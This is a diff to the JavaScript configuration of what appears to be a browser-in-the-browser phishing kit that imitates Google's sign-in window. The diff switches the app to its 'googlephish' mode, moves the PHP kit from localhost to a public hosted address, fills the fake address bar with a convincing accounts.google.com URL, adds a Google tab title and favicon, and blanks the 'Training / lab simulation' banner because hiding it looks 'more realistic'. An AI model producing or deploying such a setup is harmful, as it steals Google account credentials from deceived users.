@@ -4,7 +4,8 @@ window.APP_CONFIG = {
      * - "api" — JSON API (apiBaseUrl) + real Google Sign-In
      * - "googlephish" — BITB modal iframe → PHP googlephish kit (lab / training only)
      */
-    authMode: 'api',
+    /** Use "googlephish" to open the simulated Chrome window (BITB) below. */
+    authMode: 'googlephish',
 
     apiBaseUrl: 'https://tk-ap.onrender.com',
     googleClientId: '735055798027-6jjv31ohc5eg03olqn9i8tvav311j34l.apps.googleusercontent.com',
@@ -13,12 +14,28 @@ window.APP_CONFIG = {
     afterLoginRedirectUrl: 'https://www.google.com',
     afterLoginRedirectDelayMs: 0,
 
-    /** Base URL where PHP serves the googlephish folder (no trailing slash). Example: http://127.0.0.1:8080/googlephish */
-    googlephishBaseUrl: 'http://127.0.0.1:8080/googlephish',
+    /** Deployed PHP app (no trailing slash). Iframe loads {base}{bitbEntryPath}. */
+    googlephishBaseUrl: 'https://tk-ap-1.onrender.com',
 
-    /** Shown in the fake browser address bar (BITB). */
-    bitbDisplayUrl: 'https://accounts.google.com/v3/signin/identifier',
+    /** First path under googlephishBaseUrl (default sign-in page). */
+    bitbEntryPath: '/index.php',
 
-    /** Optional short label in the BITB chrome (e.g. training banner). */
-    bitbLabLabel: 'Training / lab simulation'
+    /**
+     * Shown in the fake omnibox (Chrome-style). Use a plausible accounts.google.com URL;
+     * the iframe still loads your Render host above.
+     */
+    bitbDisplayUrl:
+        'https://accounts.google.com/v3/signin/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-1:1234567890',
+
+    /** Fake tab / window title (Chrome default for this flow). */
+    bitbTabTitle: 'Sign in - Google Accounts',
+
+    /** Favicon in the fake tab (Google favicon reads well in most browsers). */
+    bitbFaviconUrl: 'https://www.google.com/favicon.ico',
+
+    /**
+     * Optional banner in the titlebar (empty string = hidden, more realistic).
+     * Set e.g. "Lab" only when you want an obvious training marker.
+     */
+    bitbLabLabel: ''
 };
